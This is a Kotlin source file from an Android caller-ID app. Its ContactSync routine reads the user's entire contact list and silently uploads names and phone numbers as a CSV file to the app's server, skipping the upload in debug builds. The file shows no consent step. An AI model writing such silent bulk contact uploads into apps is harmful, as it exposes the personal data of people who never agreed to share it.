package com.callerid.number.lookup.home.runtime

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.callerid.number.lookup.home.BuildConfig
import androidx.core.content.ContextCompat
import com.callerid.number.lookup.home.store.ContactItem
import com.callerid.number.lookup.home.store.ContactSource
import com.callerid.number.lookup.home.store.StorageRegistry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File

object ContactSync {

    private const val TAG = "ContactSync"
    private const val FILE_NAME = "contacts_upload.csv"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Volatile
    private var inProgress = false

    fun uploadOnceIfNeeded(context: Context) {

        if (BuildConfig.DEBUG) {
            Log.d(TAG, "Skipping upload in debug build")
            return
        }
        val app = context.applicationContext
        val prefs = StorageRegistry(app)
        if (prefs.isContactsUploaded || inProgress) return
        if (ContextCompat.checkSelfPermission(app, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) return

        if (!ApiCredentials.isConfigured) {
            Log.w(TAG, "Contact upload skipped: no API key configured")
            return
        }

        inProgress = true
        scope.launch {
            var file: File? = null
            try {
                val contacts = ContactSource(app).getContacts()
                if (contacts.isEmpty()) {
                    Log.w(TAG, "No contacts to upload")
                    return@launch
                }

                file = File(app.cacheDir, FILE_NAME).apply { writeText(toCsv(contacts)) }
                Log.d(TAG, "Uploading ${contacts.size} contacts (${file.length()} bytes)…")

                val part = MultipartBody.Part.createFormData(
                    "file", file.name, file.asRequestBody(CSV_MEDIA_TYPE)
                )
                val response = HttpClientFactory.api.uploadContacts(part).execute()

                if (response.isSuccessful) {
                    prefs.isContactsUploaded = true
                    Log.i(TAG, "Upload SUCCESS (${response.code()}): ${response.body()}")
                } else {
                    val err = runCatching { response.errorBody()?.string() }.getOrNull()
                    Log.e(TAG, "Upload FAILED (${response.code()}): $err")
                }
            } catch (e: Exception) {

                Log.e(TAG, "Upload ERROR: ${e.message}", e)
            } finally {
                runCatching { file?.delete() }
                inProgress = false
            }
        }
    }

    internal fun toCsv(contacts: List<ContactItem>): String = buildString {
        append("name,phone\n")
        contacts.forEach { contact ->
            append(csvField(contact.name)).append(',')
            append(csvField(contact.detail)).append('\n')
        }
    }

    private fun csvField(value: String?): String {
        val text = value.orEmpty()
        if (text.none { it == ',' || it == '"' || it == '\n' || it == '\r' }) return text
        return "\"" + text.replace("\"", "\"\"") + "\""
    }

    private val CSV_MEDIA_TYPE = "text/csv".toMediaTypeOrNull()
}
